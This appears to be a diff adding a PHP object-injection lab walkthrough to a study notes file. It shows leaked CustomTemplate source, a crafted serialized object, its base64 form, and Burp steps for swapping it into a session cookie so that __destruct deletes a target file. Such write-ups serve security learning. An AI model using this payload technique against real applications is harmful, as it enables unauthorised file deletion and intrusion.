@@ -476,6 +476,105 @@ Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2Vu
 
 
 
+<details>
+     <sammary>Lab: Arbitrary object injection in PHP</sammary>
+
+
+1. login as **`wiener`**
+2. notice the sitemap there is file call **`CustomTemplate.php`**
+
+<img width="627" height="217" alt="image" src="https://github.com/user-attachments/assets/28021447-066d-472f-98de-0b809d277e25" />
+
+3. send it to repeater and to se sourse code add **`~`** to file name
+
+<img width="1723" height="762" alt="image" src="https://github.com/user-attachments/assets/5c573a63-95c1-4583-bd7d-40e2629f4446" />
+
+```php
+<?php
+
+class CustomTemplate {
+    private $template_file_path;
+    private $lock_file_path;
+
+    public function __construct($template_file_path) {
+        $this->template_file_path = $template_file_path;
+        $this->lock_file_path = $template_file_path . ".lock";
+    }
+
+    private function isTemplateLocked() {
+        return file_exists($this->lock_file_path);
+    }
+
+    public function getTemplate() {
+        return file_get_contents($this->template_file_path);
+    }
+
+    public function saveTemplate($template) {
+        if (!isTemplateLocked()) {
+            if (file_put_contents($this->lock_file_path, "") === false) {
+                throw new Exception("Could not write to " . $this->lock_file_path);
+            }
+            if (file_put_contents($this->template_file_path, $template) === false) {
+                throw new Exception("Could not write to " . $this->template_file_path);
+            }
+        }
+    }
+
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+        }
+    }
+}
+
+?>
+```
+
+4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
+
+5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
+
+```json
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+
+```
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ0K
+```
+
+6.  Send a request containing the session cookie to Burp Repeater.
+7.  In Burp Repeater, replace the session cookie with the modified one in your clipboard.
+8.  Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.
+
+
+
+<img width="1557" height="641" alt="image" src="https://github.com/user-attachments/assets/daf1c9c1-bd17-4010-b71b-78b6138a6a30" />
+
+
+
+
+     
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
